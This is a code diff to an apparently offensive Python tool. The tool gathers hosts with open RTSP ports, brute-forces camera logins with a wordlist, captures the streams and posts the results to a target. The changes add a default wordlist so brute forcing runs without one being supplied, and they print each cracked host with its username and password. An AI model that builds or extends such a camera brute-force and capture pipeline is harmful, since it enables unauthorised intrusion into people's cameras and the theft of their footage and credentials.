@@ -17,7 +17,7 @@ from rich.console import Console
 
 from .fortune import fortune_rtsp as fortune_rtsp_module
 from .output import Reporter
-from .rtsp import rtsp_brute as rtsp_brute_module, rtsp_capture as rtsp_capture_module
+from .rtsp import DEFAULT_WORDLIST, rtsp_brute as rtsp_brute_module, rtsp_capture as rtsp_capture_module
 from .scope import ScopeError
 from .camposter import camposter as camposter_module
 
@@ -43,6 +43,7 @@ async def _run_pipeline(
         return
 
     # Step 1: gather IPs with open RTSP port (fortune_rtsp).
+    console.print()
     console.print("[bold cyan]Gather IPs[/bold cyan]")
     rtsp_hosts = await fortune_rtsp_module(
         count,
@@ -63,8 +64,11 @@ async def _run_pipeline(
                 "--authorize-brute is required for the brute-force step."
             )
         if wordlist is None:
-            raise ScopeError("--wordlist is required for the brute-force step.")
+            wordlist = DEFAULT_WORDLIST
+        if not wordlist.exists():
+            raise ScopeError(f"Wordlist not found: {wordlist}")
 
+        console.print()
         console.print("[bold cyan]Brute[/bold cyan]")
         brute_results = await rtsp_brute_module(
             hosts,
@@ -77,16 +81,22 @@ async def _run_pipeline(
         brute_hosts = [
             r["host"] for r in brute_results if r.get("credentials")
         ]
-        console.print(
-            f"[green]Bruted {len(brute_hosts)} hosts[/green]"
-        )
+        console.print(f"[green]Bruted {len(brute_hosts)} hosts[/green]")
+        for r in brute_results:
+            if r.get("credentials"):
+                creds = ", ".join(
+                    f"{c['user']}:{c['password']}" for c in r["credentials"]
+                )
+                console.print(f"  [bold green]{r['host']}:{r['port']}[/bold green] -> {creds}")
     else:
         brute_hosts = hosts
+        console.print()
         console.print("[yellow]Skipping brute force[/yellow]")
 
     # Step 3: capture (rtsp_capture).
     capture_targets = brute_hosts if brute_hosts else hosts
     if do_capture:
+        console.print()
         console.print("[bold cyan]Capture[/bold cyan]")
         await rtsp_capture_module(
             capture_targets,
@@ -96,6 +106,7 @@ async def _run_pipeline(
 
     # Step 4: POST (camposter).
     if do_post:
+        console.print()
         console.print("[bold cyan]Post[/bold cyan]")
         await camposter_module(
             [post_target],
